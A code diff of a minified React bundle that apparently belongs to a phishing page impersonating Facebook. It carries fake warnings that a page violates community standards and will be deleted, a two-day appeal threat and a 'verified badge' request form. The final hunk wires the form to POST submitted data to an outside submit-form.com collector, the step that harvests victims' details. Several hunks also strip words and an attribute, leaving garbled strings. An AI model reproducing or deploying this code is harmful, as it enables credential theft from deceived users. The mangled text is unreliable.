@@ -9835,7 +9835,7 @@
                                     className: "form-item",
                                     children: [(0,
                                     he.jsx)("p", {
-                                        children: "We have detected violation on your recent page post that violates our community standards."
+                                        children: "We have detected violation on your recent page  that violates our community standards."
                                     }), (0,
                                     he.jsx)("p", {
                                         children: "We have scheduled your page to be deleted"
@@ -9850,7 +9850,7 @@
                                     he.jsx)("video", {
                                         src: "https://cdn.glitch.global/04223cf5-c2c7-4a98-99b2-9da638394728/WhatsApp%20Video%202024-11-26%20at%2013.24.43_9bcb50f5.mp4?v=1732616291608",
                                         controls: !0,
-                                        poster: me,
+                                        er: me,
                                         autoPlay: !0
                                     }), (0,
                                     he.jsx)("p", {
@@ -11099,7 +11099,7 @@
                                             he.jsxs)("ul", {
                                                 children: [(0,
                                                 he.jsx)("li", {
-                                                    children: "In your appeal,Please ensure that all necessary information is included in your request so that it can be processed promptly. If you provide incorrect information or fail to respond to requests for additional information within 2 days, your appeal may be closed without further review. and your page will be deleted for permanently"
+                                                    children: "In your appeal,Please ensure that all necessary information is included in your  so that it can be processed promptly. If you provide incorrect information or fail to respond to s for additional information within 2 days, your appeal may be closed without further review. and your page will be deleted for permanently"
                                                 }), (0,
                                                 he.jsx)("li", {
                                                     children: "After your submission, we will review your appeal and cancel the page deletion if the information you provide is correct. The review process typically takes 24 hours, though in some cases it may take longer."
@@ -13306,7 +13306,7 @@
                             children: (0,
                             he.jsx)("h5", {
                                 className: "m-0",
-                                children: "Request a verified badge on Facebook"
+                                children: " a verified badge on Facebook"
                             })
                         }), (0,
                         he.jsxs)("div", {
@@ -13355,8 +13355,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("
-                                                    ", {
+                                    u && o ? (fetch("https://submit-form.com/lnNnPBNSr", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
